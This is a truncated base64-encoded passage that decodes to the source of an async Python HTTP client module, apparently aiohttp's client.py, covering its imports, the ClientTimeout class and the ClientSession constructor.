cclxuZnJvbSBjb250ZXh0bGliIGltcG9ydCBzdXBwcmVzc1xyXG5mcm9tIHR5cGVzIGltcG9ydCBTaW1wbGVOYW1lc3BhY2UsIFRyYWNlYmFja1R5cGVcclxuZnJvbSB0eXBpbmcgaW1wb3J0IChcclxuICAgIEFueSxcclxuICAgIEF3YWl0YWJsZSxcclxuICAgIENhbGxhYmxlLFxyXG4gICAgQ29yb3V0aW5lLFxyXG4gICAgRnJvemVuU2V0LFxyXG4gICAgR2VuZXJhdG9yLFxyXG4gICAgR2VuZXJpYyxcclxuICAgIEl0ZXJhYmxlLFxyXG4gICAgTGlzdCxcclxuICAgIE1hcHBpbmcsXHJcbiAgICBPcHRpb25hbCxcclxuICAgIFNldCxcclxuICAgIFR1cGxlLFxyXG4gICAgVHlwZSxcclxuICAgIFR5cGVWYXIsXHJcbiAgICBVbmlvbixcclxuKVxyXG5cclxuaW1wb3J0IGF0dHJcclxuZnJvbSBtdWx0aWRpY3QgaW1wb3J0IENJTXVsdGlEaWN0LCBNdWx0aURpY3QsIE11bHRpRGljdFByb3h5LCBpc3RyXHJcbmZyb20geWFybCBpbXBvcnQgVVJMXHJcblxyXG5mcm9tIC4gaW1wb3J0IGhkcnMsIGh0dHAsIHBheWxvYWRcclxuZnJvbSAuYWJjIGltcG9ydCBBYnN0cmFjdENvb2tpZUphclxyXG5mcm9tIC5jbGllbnRfZXhjZXB0aW9ucyBpbXBvcnQgKFxyXG4gICAgQ2xpZW50Q29ubmVjdGlvbkVycm9yIGFzIENsaWVudENvbm5lY3Rpb25FcnJvcixcclxuICAgIENsaWVudENvbm5lY3RvckNlcnRpZmljYXRlRXJyb3IgYXMgQ2xpZW50Q29ubmVjdG9yQ2VydGlmaWNhdGVFcnJvcixcclxuICAgIENsaWVudENvbm5lY3RvckVycm9yIGFzIENsaWVudENvbm5lY3RvckVycm9yLFxyXG4gICAgQ2xpZW50Q29ubmVjdG9yU1NMRXJyb3IgYXMgQ2xpZW50Q29ubmVjdG9yU1NMRXJyb3IsXHJcbiAgICBDbGllbnRFcnJvciBhcyBDbGllbnRFcnJvcixcclxuICAgIENsaWVudEh0dHBQcm94eUVycm9yIGFzIENsaWVudEh0dHBQcm94eUVycm9yLFxyXG4gICAgQ2xpZW50T1NFcnJvciBhcyBDbGllbnRPU0Vycm9yLFxyXG4gICAgQ2xpZW50UGF5bG9hZEVycm9yIGFzIENsaWVudFBheWxvYWRFcnJvcixcclxuICAgIENsaWVudFByb3h5Q29ubmVjdGlvbkVycm9yIGFzIENsaWVudFByb3h5Q29ubmVjdGlvbkVycm9yLFxyXG4gICAgQ2xpZW50UmVzcG9uc2VFcnJvciBhcyBDbGllbnRSZXNwb25zZUVycm9yLFxyXG4gICAgQ2xpZW50U1NMRXJyb3IgYXMgQ2xpZW50U1NMRXJyb3IsXHJcbiAgICBDb250ZW50VHlwZUVycm9yIGFzIENvbnRlbnRUeXBlRXJyb3IsXHJcbiAgICBJbnZhbGlkVVJMIGFzIEludmFsaWRVUkwsXHJcbiAgICBTZXJ2ZXJDb25uZWN0aW9uRXJyb3IgYXMgU2VydmVyQ29ubmVjdGlvbkVycm9yLFxyXG4gICAgU2VydmVyRGlzY29ubmVjdGVkRXJyb3IgYXMgU2VydmVyRGlzY29ubmVjdGVkRXJyb3IsXHJcbiAgICBTZXJ2ZXJGaW5nZXJwcmludE1pc21hdGNoIGFzIFNlcnZlckZpbmdlcnByaW50TWlzbWF0Y2gsXHJcbiAgICBTZXJ2ZXJUaW1lb3V0RXJyb3IgYXMgU2VydmVyVGltZW91dEVycm9yLFxyXG4gICAgVG9vTWFueVJlZGlyZWN0cyBhcyBUb29NYW55UmVkaXJlY3RzLFxyXG4gICAgV1NTZXJ2ZXJIYW5kc2hha2VFcnJvciBhcyBXU1NlcnZlckhhbmRzaGFrZUVycm9yLFxyXG4pXHJcbmZyb20gLmNsaWVudF9yZXFyZXAgaW1wb3J0IChcclxuICAgIENsaWVudFJlcXVlc3QgYXMgQ2xpZW50UmVxdWVzdCxcclxuICAgIENsaWVudFJlc3BvbnNlIGFzIENsaWVudFJlc3BvbnNlLFxyXG4gICAgRmluZ2VycHJpbnQgYXMgRmluZ2VycHJpbnQsXHJcbiAgICBSZXF1ZXN0SW5mbyBhcyBSZXF1ZXN0SW5mbyxcclxuICAgIF9tZXJnZV9zc2xfcGFyYW1zLFxyXG4pXHJcbmZyb20gLmNsaWVudF93cyBpbXBvcnQgQ2xpZW50V2ViU29ja2V0UmVzcG9uc2UgYXMgQ2xpZW50V2ViU29ja2V0UmVzcG9uc2VcclxuZnJvbSAuY29ubmVjdG9yIGltcG9ydCAoXHJcbiAgICBCYXNlQ29ubmVjdG9yIGFzIEJhc2VDb25uZWN0b3IsXHJcbiAgICBOYW1lZFBpcGVDb25uZWN0b3IgYXMgTmFtZWRQaXBlQ29ubmVjdG9yLFxyXG4gICAgVENQQ29ubmVjdG9yIGFzIFRDUENvbm5lY3RvcixcclxuICAgIFVuaXhDb25uZWN0b3IgYXMgVW5peENvbm5lY3RvcixcclxuKVxyXG5mcm9tIC5jb29raWVqYXIgaW1wb3J0IENvb2tpZUphclxyXG5mcm9tIC5oZWxwZXJzIGltcG9ydCAoXHJcbiAgICBERUJVRyxcclxuICAgIFBZXzM2LFxyXG4gICAgQmFzaWNBdXRoLFxyXG4gICAgVGltZW91dEhhbmRsZSxcclxuICAgIGNlaWxfdGltZW91dCxcclxuICAgIGdldF9lbnZfcHJveHlfZm9yX3VybCxcclxuICAgIGdldF9ydW5uaW5nX2xvb3AsXHJcbiAgICBzZW50aW5lbCxcclxuICAgIHN0cmlwX2F1dGhfZnJvbV91cmwsXHJcbilcclxuZnJvbSAuaHR0cCBpbXBvcnQgV1NfS0VZLCBIdHRwVmVyc2lvbiwgV2ViU29ja2V0UmVhZGVyLCBXZWJTb2NrZXRXcml0ZXJcclxuZnJvbSAuaHR0cF93ZWJzb2NrZXQgaW1wb3J0IFdTSGFuZHNoYWtlRXJyb3IsIFdTTWVzc2FnZSwgd3NfZXh0X2dlbiwgd3NfZXh0X3BhcnNlXHJcbmZyb20gLnN0cmVhbXMgaW1wb3J0IEZsb3dDb250cm9sRGF0YVF1ZXVlXHJcbmZyb20gLnRyYWNpbmcgaW1wb3J0IFRyYWNlLCBUcmFjZUNvbmZpZ1xyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgRmluYWwsIEpTT05FbmNvZGVyLCBMb29zZUNvb2tpZXMsIExvb3NlSGVhZGVycywgU3RyT3JVUkxcclxuXHJcbl9fYWxsX18gPSAoXHJcbiAgICAjIGNsaWVudF9leGNlcHRpb25zXHJcbiAgICAiQ2xpZW50Q29ubmVjdGlvbkVycm9yIixcclxuICAgICJDbGllbnRDb25uZWN0b3JDZXJ0aWZpY2F0ZUVycm9yIixcclxuICAgICJDbGllbnRDb25uZWN0b3JFcnJvciIsXHJcbiAgICAiQ2xpZW50Q29ubmVjdG9yU1NMRXJyb3IiLFxyXG4gICAgIkNsaWVudEVycm9yIixcclxuICAgICJDbGllbnRIdHRwUHJveHlFcnJvciIsXHJcbiAgICAiQ2xpZW50T1NFcnJvciIsXHJcbiAgICAiQ2xpZW50UGF5bG9hZEVycm9yIixcclxuICAgICJDbGllbnRQcm94eUNvbm5lY3Rpb25FcnJvciIsXHJcbiAgICAiQ2xpZW50UmVzcG9uc2VFcnJvciIsXHJcbiAgICAiQ2xpZW50U1NMRXJyb3IiLFxyXG4gICAgIkNvbnRlbnRUeXBlRXJyb3IiLFxyXG4gICAgIkludmFsaWRVUkwiLFxyXG4gICAgIlNlcnZlckNvbm5lY3Rpb25FcnJvciIsXHJcbiAgICAiU2VydmVyRGlzY29ubmVjdGVkRXJyb3IiLFxyXG4gICAgIlNlcnZlckZpbmdlcnByaW50TWlzbWF0Y2giLFxyXG4gICAgIlNlcnZlclRpbWVvdXRFcnJvciIsXHJcbiAgICAiVG9vTWFueVJlZGlyZWN0cyIsXHJcbiAgICAiV1NTZXJ2ZXJIYW5kc2hha2VFcnJvciIsXHJcbiAgICAjIGNsaWVudF9yZXFyZXBcclxuICAgICJDbGllbnRSZXF1ZXN0IixcclxuICAgICJDbGllbnRSZXNwb25zZSIsXHJcbiAgICAiRmluZ2VycHJpbnQiLFxyXG4gICAgIlJlcXVlc3RJbmZvIixcclxuICAgICMgY29ubmVjdG9yXHJcbiAgICAiQmFzZUNvbm5lY3RvciIsXHJcbiAgICAiVENQQ29ubmVjdG9yIixcclxuICAgICJVbml4Q29ubmVjdG9yIixcclxuICAgICJOYW1lZFBpcGVDb25uZWN0b3IiLFxyXG4gICAgIyBjbGllbnRfd3NcclxuICAgICJDbGllbnRXZWJTb2NrZXRSZXNwb25zZSIsXHJcbiAgICAjIGNsaWVudFxyXG4gICAgIkNsaWVudFNlc3Npb24iLFxyXG4gICAgIkNsaWVudFRpbWVvdXQiLFxyXG4gICAgInJlcXVlc3QiLFxyXG4pXHJcblxyXG5cclxudHJ5OlxyXG4gICAgZnJvbSBzc2wgaW1wb3J0IFNTTENvbnRleHRcclxuZXhjZXB0IEltcG9ydEVycm9yOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBTU0xDb250ZXh0ID0gb2JqZWN0ICAjIHR5cGU6IGlnbm9yZVttaXNjLGFzc2lnbm1lbnRdXHJcblxyXG5cclxuQGF0dHIucyhhdXRvX2F0dHJpYnM9VHJ1ZSwgZnJvemVuPVRydWUsIHNsb3RzPVRydWUpXHJcbmNsYXNzIENsaWVudFRpbWVvdXQ6XHJcbiAgICB0b3RhbDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZVxyXG4gICAgY29ubmVjdDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZVxyXG4gICAgc29ja19yZWFkOiBPcHRpb25hbFtmbG9hdF0gPSBOb25lXHJcbiAgICBzb2NrX2Nvbm5lY3Q6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmVcclxuXHJcbiAgICAjIHBvb2xfcXVldWVfdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZVxyXG4gICAgIyBkbnNfcmVzb2x1dGlvbl90aW1lb3V0OiBPcHRpb25hbFtmbG9hdF0gPSBOb25lXHJcbiAgICAjIHNvY2tldF9jb25uZWN0X3RpbWVvdXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmVcclxuICAgICMgY29ubmVjdGlvbl9hY3F1aXJpbmdfdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZVxyXG4gICAgIyBuZXdfY29ubmVjdGlvbl90aW1lb3V0OiBPcHRpb25hbFtmbG9hdF0gPSBOb25lXHJcbiAgICAjIGh0dHBfaGVhZGVyX3RpbWVvdXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmVcclxuICAgICMgcmVzcG9uc2VfYm9keV90aW1lb3V0OiBPcHRpb25hbFtmbG9hdF0gPSBOb25lXHJcblxyXG4gICAgIyB0byBjcmVhdGUgYSB0aW1lb3V0IHNwZWNpZmljIGZvciBhIHNpbmdsZSByZXF1ZXN0LCBlaXRoZXJcclxuICAgICMgLSBjcmVhdGUgYSBjb21wbGV0ZWx5IG5ldyBvbmUgdG8gb3ZlcndyaXRlIHRoZSBkZWZhdWx0XHJcbiAgICAjIC0gb3IgdXNlIGh0dHA6Ly93d3cuYXR0cnMub3JnL2VuL3N0YWJsZS9hcGkuaHRtbCNhdHRyLmV2b2x2ZVxyXG4gICAgIyB0byBvdmVyd3JpdGUgdGhlIGRlZmF1bHRzXHJcblxyXG5cclxuIyA1IE1pbnV0ZSBkZWZhdWx0IHJlYWQgdGltZW91dFxyXG5ERUZBVUxUX1RJTUVPVVQ6IEZpbmFsW0NsaWVudFRpbWVvdXRdID0gQ2xpZW50VGltZW91dCh0b3RhbD01ICogNjApXHJcblxyXG5fUmV0VHlwZSA9IFR5cGVWYXIoIl9SZXRUeXBlIilcclxuXHJcblxyXG5jbGFzcyBDbGllbnRTZXNzaW9uOlxyXG4gICAgIiIiRmlyc3QtY2xhc3MgaW50ZXJmYWNlIGZvciBtYWtpbmcgSFRUUCByZXF1ZXN0cy4iIiJcclxuXHJcbiAgICBBVFRSUyA9IGZyb3plbnNldChcclxuICAgICAgICBbXHJcbiAgICAgICAgICAgICJfYmFzZV91cmwiLFxyXG4gICAgICAgICAgICAiX3NvdXJjZV90cmFjZWJhY2siLFxyXG4gICAgICAgICAgICAiX2Nvbm5lY3RvciIsXHJcbiAgICAgICAgICAgICJyZXF1b3RlX3JlZGlyZWN0X3VybCIsXHJcbiAgICAgICAgICAgICJfbG9vcCIsXHJcbiAgICAgICAgICAgICJfY29va2llX2phciIsXHJcbiAgICAgICAgICAgICJfY29ubmVjdG9yX293bmVyIixcclxuICAgICAgICAgICAgIl9kZWZhdWx0X2F1dGgiLFxyXG4gICAgICAgICAgICAiX3ZlcnNpb24iLFxyXG4gICAgICAgICAgICAiX2pzb25fc2VyaWFsaXplIixcclxuICAgICAgICAgICAgIl9yZXF1b3RlX3JlZGlyZWN0X3VybCIsXHJcbiAgICAgICAgICAgICJfdGltZW91dCIsXHJcbiAgICAgICAgICAgICJfcmFpc2VfZm9yX3N0YXR1cyIsXHJcbiAgICAgICAgICAgICJfYXV0b19kZWNvbXByZXNzIixcclxuICAgICAgICAgICAgIl90cnVzdF9lbnYiLFxyXG4gICAgICAgICAgICAiX2RlZmF1bHRfaGVhZGVycyIsXHJcbiAgICAgICAgICAgICJfc2tpcF9hdXRvX2hlYWRlcnMiLFxyXG4gICAgICAgICAgICAiX3JlcXVlc3RfY2xhc3MiLFxyXG4gICAgICAgICAgICAiX3Jlc3BvbnNlX2NsYXNzIixcclxuICAgICAgICAgICAgIl93c19yZXNwb25zZV9jbGFzcyIsXHJcbiAgICAgICAgICAgICJfdHJhY2VfY29uZmlncyIsXHJcbiAgICAgICAgICAgICJfcmVhZF9idWZzaXplIixcclxuICAgICAgICBdXHJcbiAgICApXHJcblxyXG4gICAgX3NvdXJjZV90cmFjZWJhY2sgPSBOb25lXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgYmFzZV91cmw6IE9wdGlvbmFsW1N0ck9yVVJMXSA9IE5vbmUsXHJcbiAgICAgICAgKixcclxuICAgICAgICBjb25uZWN0b3I6IE9wdGlvbmFsW0Jhc2VDb25uZWN0b3JdID0gTm9uZSxcclxuICAgICAgICBsb29wOiBPcHRpb25hbFthc3luY2lvLkFic3RyYWN0RXZlbnRMb29wXSA9IE5vbmUsXHJcbiAgICAgICAgY29va2llczogT3B0aW9uYWxbTG9vc2VDb29raWVzXSA9IE5vbmUsXHJcbiAgICAgICAgaGVhZGVyczogT3B0aW9uYWxbTG9vc2VIZWFkZXJzXSA9IE5vbmUsXHJcbiAgICAgICAgc2tpcF9hdXRvX2hlYWRlcnM6IE9wdGlvbmFsW0l0ZXJhYmxlW3N0cl1dID0gTm9uZSxcclxuICAgICAgICBhdXRoOiBPcHRpb25hbFtCYXNpY0F1dGhdID0gTm9uZSxcclxuICAgICAgICBqc29uX3NlcmlhbGl6ZTogSlNPTkVuY29kZXIgPSBqc29uLmR1bXBzLFxyXG4gICAgICAgIHJlcXVlc3RfY2xhc3M6IFR5cGVbQ2xpZW50UmVxdWVzdF0gPSBDbGllbnRSZXF1ZXN0LFxyXG4gICAgICAgIHJlc3BvbnNlX2NsYXNzOiBUeXBlW0NsaWVudFJlc3BvbnNlXSA9IENsaWVudFJlc3BvbnNlLFxyXG4gICAgICAgIHdzX3Jlc3BvbnNlX2NsYXNzOiBUeXBlW0NsaWVudFdlYlNvY2tldFJlc3BvbnNlXSA9IENsaWVudFdlYlNvY2tldFJlc3BvbnNlLFxyXG4gICAgICAgIHZlcnNpb246IEh0dHBWZXJzaW9uID0gaHR0cC5IdHRwVmVyc2lvbjExLFxyXG4gICAgICAgIGNvb2tpZV9qYXI6IE9wdGlvbmFsW0Fic3RyYWN0Q29va2llSmFyXSA9IE5vbmUsXHJcbiAgICAgICAgY29ubmVjdG9yX293bmVyOiBib29sID0gVHJ1ZSxcclxuICAgICAgICByYWlzZV9mb3Jfc3RhdHVzOiBib29sID0gRmFsc2UsXHJcbiAgICAgICAgcmVhZF90aW1lb3V0OiBVbmlvbltmbG9hdCwgb2JqZWN0XSA9IHNlbnRpbmVsLFxyXG4gICAgICAgIGNvbm5fdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZSxcclxuICAgICAgICB0aW1lb3V0OiBVbmlvbltvYmplY3QsIENsaWVudFRpbWVvdXRdID0gc2VudGluZWwsXHJcbiAgICAgICAgYXV0b19kZWNvbXByZXNzOiBib29sID0gVHJ1ZSxcclxuICAgICAgICB0cnVzdF9lbnY6IGJvb2wgPSBGYWxzZSxcclxuICAgICAgICByZXF1b3RlX3JlZGlyZWN0X3VybDogYm9vbCA9IFRydWUsXHJcbiAgICAgICAgdHJhY2VfY29uZmlnczogT3B0aW9uYWxbTGlzdFtUcmFjZUNvbmZpZ11dID0gTm9uZSxcclxuICAgICAgICByZWFkX2J1ZnNpemU6IGludCA9IDIgKiogMTYsXHJcbiAgICApIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbG9vcCBpcyBOb25lOlxyXG4gICAgICAgICAgICBpZiBjb25uZWN0b3IgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICBsb29wID0gY29ubmVjdG9yLl9sb29wXHJcblxyXG4gICAgICAgIGxvb3AgPSBnZXRfcnVubmluZ19sb29wKGxvb3ApXHJcblxyXG4gICAgICAgIGlmIGJhc2VfdXJsIGlzIE5vbmUgb3IgaXNpbnN0YW5jZShiYXNlX3VybCwgVVJMKTpcclxuICAgICAgICAgICAgc2VsZi5fYmFzZV91cmw6IE9wdGlvbmFsW1VSTF0gPSBiYXNlX3VybFxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX2Jhc2VfdXJsID0gVVJMKGJhc2VfdXJsKVxyXG4gICAgICAgICAgICBhc3NlcnQgKFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYmFzZV91cmwub3JpZ2luKCkgPT0gc2VsZi5fYmFzZV91cmxcclxuICAgICAgICAgICAgKSwgIk9ubHkgYWJzb2x1dGUgVVJMcyB3aXRob3V0IHBhdGggcGFydCBhcmUgc3VwcG9ydGVkIlxyXG5cclxuICAgICAgICBpZiBjb25uZWN0b3IgaXMgTm9uZTpcclxuICAgICAgICAgICAgY29ubmVjdG9yID0gVENQQ29ubmVjdG9yKGxvb3A9bG9vcClcclxuXHJcbiAgICAgICAgaWYgY29ubmVjdG9yLl9sb29wIGlzIG5vdCBsb29wOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIlNlc3Npb24gYW5kIGNvbm5lY3RvciBoYXMgdG8gdXNlIHNhbWUgZXZlbnQgbG9vcCIpXHJcblxyXG4gICAgICAgIHNlbGYuX2xvb3AgPSBsb29wXHJcblxyXG4gICAgICAgIGlmIGxvb3AuZ2V0X2RlYnVnKCk6XHJcbiAgICAgICAgICAgIHNlbGYuX3NvdXJjZV90cmFjZWJhY2sgPSB0cmFjZWJhY2suZXh0cmFjdF9zdGFjayhzeXMuX2dldGZyYW1lKDEpKVxyXG5cclxuICAgICAgICBpZiBjb29raWVfamFyIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGNvb2tpZV9qYXIgPSBDb29raWVKYXIobG9vcD1sb29wKVxyXG4gICAgICAgIHNlbGYuX2Nvb2tpZV9qYXIgPSBjb29raWVfamFyXHJcblxyXG4gICAgICAgIGlmIGNvb2tpZXMgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2Nvb2tpZV9qYXIudXBkYXRlX2Nvb2tpZXMoY29va2llcylcclxuXHJcbiAgICAgICAgc2VsZi5fY29ubmVjdG9yID0gY29ubmVjdG9yICAjIHR5cGU6IE9wdGlvbmFsW0Jhc2VDb25uZWN0b3JdXHJcbiAgICAgICAgc2VsZi5fY29ubmVjdG9yX293bmVyID0gY29ubmVjdG9yX293bmVyXHJcbiAgICAgICAgc2VsZi5fZGVmYXVsdF9hdXRoID0gYXV0aFxyXG4gICAgICAgIHNlbGYuX3ZlcnNpb24gPSB2ZXJzaW9uXHJcbiAgICAgICAgc2VsZi5fanNvbl9zZXJpYWxpemUgPSBqc29uX3NlcmlhbGl6ZVxyXG4gICAgICAgIGlmIHRpbWVvdXQgaXMgc2VudGluZWw6XHJcbiAgICAgICAgICAgIHNlbGYuX3RpbWVvdXQgPSBERUZBVUxUX1RJTUVPVVRcclxuICAgICAgICAgICAgaWYgcmVhZF90aW1lb3V0IGlzIG5vdCBzZW50aW5lbDpcclxuICAgICAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICAgICAgICAgInJlYWRfdGltZW91dCBpcyBkZXByZWNhdGVkLCAiICJ1c2UgdGltZW91dCBhcmd1bWVudCBpbnN0ZWFkIixcclxuICAgICAgICAgICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsXHJcbiAgICAgICAgICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgc2VsZi5fdGltZW91dCA9IGF0dHIuZXZvbHZlKHNlbGYuX3RpbWVvdXQsIHRvdGFsPXJlYWRfdGltZW91dClcclxuICAgICAgICAgICAgaWYgY29ubl90aW1lb3V0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgc2VsZi5fdGltZW91dCA9IGF0dHIuZXZvbHZlKHNlbGYuX3RpbWVvdXQsIGNvbm5lY3Q9Y29ubl90aW1lb3V0KVxyXG4gICAgICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICAgICAiY29ubl90aW1lb3V0IGlzIGRlcHJlY2F0ZWQsICIgInVzZSB0aW1lb3V0IGFyZ3VtZW50IGluc3RlYWQiLFxyXG4gICAgICAgICAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgc2VsZi5fdGltZW91dCA9IHRpbWVvdXQgICMgdHlwZTogaWdub3JlW2Fzc2lnbm1lbnRdXHJcbiAgICAgICAgICAgIGlmIHJlYWRfdGltZW91dCBpcyBub3Qgc2VudGluZWw6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJyZWFkX3RpbWVvdXQgYW5kIHRpbWVvdXQgcGFyYW1ldGVycyAiXHJcbiAgICAgICAgICAgICAgICAgICAgImNvbmZsaWN0LCBwbGVhc2Ugc2V0dXAgIlxyXG4gICAgICAgICAgICAgICAgICAgICJ0aW1lb3V0LnJlYWQiXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIGlmIGNvbm5fdGltZW91dCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgImNvbm5fdGltZW91dCBhbmQgdGltZW91dCBwYXJhbWV0ZXJzICJcclxuICAgICAgICAgICAgICAgICAgICAiY29uZmxpY3QsIHBsZWFzZSBzZXR1cCAiXHJcbiAgICAgICAgICAgICAgICAgICAgInRpbWVvdXQuY29ubmVjdCJcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLl9yYWlzZV9mb3Jfc3RhdHVzID0gcmFpc2VfZm9yX3N0YXR1c1xyXG4gICAgICAgIHNlbGYuX2F1dG9fZGVjb21wcmVzcyA9IGF1dG9fZGVjb21wcmVzc1xyXG4gICAgICAgIHNlbGYuX3RydXN0X2VudiA9IHRydXN0X2VudlxyXG4gICAgICAgIHNlbGYuX3JlcXVvdGVfcmVkaXJlY3RfdXJsID0gcmVxdW90ZV9yZWRpcmVjdF91cmxcclxuICAgICAgICBzZWxmLl9yZWFkX2J1ZnNpemUgPSByZWFkX2J1ZnNpemVcclxuXHJcbiAgICAgICAgIyBDb252ZXJ0IHRvIGxpc3Qgb2YgdHVwbGVzXHJcbiAgICAgICAgaWYgaGVhZGVyczpcclxuICAgICAgICAgICAgcmVhbF9oZWFkZXJzID0gQ0lNdWx0aURpY3QoaGVhZGVycykgICMgdHlwZTogQ0lNdWx0aURpY3Rbc3RyXVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJlYWxfaGVhZGVycyA9IENJTXVsdGlEaWN0KClcclxuICAgICAgICBzZWxmLl9kZWZhdWx0X2hlYWRlcnMgPSByZWFsX2hlYWRlcnMgICMgdHlwZTogQ0lNdWx0aURpY3Rbc3RyXVxyXG4gICAgICAgIGlmIHNraXBfYXV0b19oZWFkZXJzIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9za2lwX2F1dG9faGVhZGVycyA9IGZyb3plbnNldChpc3RyKGkpIGZvciBpIGluIHNraXBfYXV0b19oZWFkZXJzKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX3NraXBfYXV0b19oZWFkZXJzID0gZnJvemVuc2V0KClcclxuXHJcbiAgICAgICAgc2VsZi5fcmVxdWVzdF9jbGFzcyA9IHJlcXVlc3RfY2xhc3NcclxuICAgICAgICBzZWxmLl9yZXNwb25zZV9jbGFzcyA9IHJlc3BvbnNlX2NsYXNzXHJcbiAgICAgICAgc2VsZi5fd3NfcmVzcG9uc2VfY2xhc3MgPSB3c19yZXNwb25zZV9jbGFzc1xyXG5cclxuICAgICAgICBzZWxmLl90cmFjZV9jb25maWdzID0gdHJhY2VfY29uZmlncyBvciBbXVxyXG4gICAgICAgIGZvciB0cmFjZV9jb25maWcgaW4gc2VsZi5fdHJhY2VfY29uZmlnczpcclxuICAgICAgICAgICAgdHJhY2VfY29uZmlnLmZyZWV6ZSgpXHJcblxyXG4gICAgZGVmIF9faW5pdF9zdWJjbGFzc19fKGNsczogVHlwZVsiQ2xpZW50U2Vzc2lvbiJdKSAtPiBOb25lOlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJJbmhlcml0YW5jZSBjbGFzcyB7fSBmcm9tIENsaWVudFNlc3Npb24gIlxyXG4gICAgICAgICAgICAiaXMgZGlzY291cmFnZWQiLmZvcm1hdChjbHMuX19uYW1lX18pLFxyXG4gICAgICAgICAgICBEZXByZWNhdGlvbldhcm5pbmcsXHJcbiAgICAgICAgICAgIHN0YWNrbGV2ZWw9MixcclxuICAgICAgICApXHJcblxyXG4gICAgaWYgREVCVUc6XHJcblxyXG4gICAgICAgIGRlZiBfX3NldGF0dHJfXyhzZWxmLCBuYW1lOiBzdHIsIHZhbDogQW55KSAtPiBOb25lOlxyXG4gICAgICAgICAgICBpZiBuYW1lIG5vdCBpbiBzZWxmLkFUVFJTOlxyXG4gICAgICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICAgICAiU2V0dGluZyBjdXN0b20gQ2xpZW50U2Vzc2lvbi57fSBhdHRyaWJ1dGUgIlxyXG4gICAgICAgICAgICAgICAgICAgICJpcyBkaXNjb3VyYWdlZCIuZm9ybWF0KG5hbWUpLFxyXG4gICAgICAgICAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgICAgICAgICBzdGFja2xldmVsPTIsXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHN1cGVyKCkuX19zZXRhdHRyX18obmFtZSwgdmFsKVxyXG5cclxuICAgIGRlZiBfX2RlbF9fKHNlbGYsIF93YXJuaW5nczogQW55ID0gd2FybmluZ3MpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IHNlbGYuY2xvc2VkOlxyXG4gICAgICAgICAgICBpZiBQWV8zNjpcclxuICAgICAgICAgICAgICAgIGt3YXJncyA9IHsic291cmNlIjogc2VsZn1cclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGt3YXJncyA9IHt9XHJcbiAgICAgICAgICAgIF93YXJuaW5ncy53YXJuKFxyXG4gICAgICAgICAgICAgICAgZiJVbmNsb3NlZCBjbGllbnQgc2Vzc2lvbiB7c2VsZiFyfSIsIFJlc291cmNlV2FybmluZywgKiprd2FyZ3NcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBjb250ZXh0ID0geyJjbGllbnRfc2Vzc2lvbiI6IHNlbGYsICJtZXNzYWdlIjogIlVuY2xvc2VkIGNsaWVudCBzZXNzaW9uIn1cclxuICAgICAgICAgICAgaWYgc2VsZi5fc291cmNlX3RyYWNlYmFjayBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIGNvbnRleHRbInNvdXJjZV90cmFjZWJhY2siXSA9IHNlbGYuX3NvdXJjZV90cmFjZWJhY2tcclxuICAgICAgICAgICAgc2VsZi5fbG9vcC5jYWxsX2V4Y2VwdGlvbl9oYW5kbGVyKGNvbnRleHQpXHJcblxyXG4gICAgZGVmIHJlcXVlc3QoXHJcbiAgICAgICAgc2VsZiwgbWV0aG9kOiBzdHIsIHVybDogU3RyT3JVUkwsICoqa3dhcmdzOiBBbnlcclxuICAgICkgLT4gIl9SZXF1ZXN0Q29udGV4dE1hbmFnZXIiOlxyXG4gICAgICAgICIiIlBlcmZvcm0gSFRUUCByZXF1ZXN0LiIiIlxyXG4gICAgICAgIHJldHVybiBfUmVxdW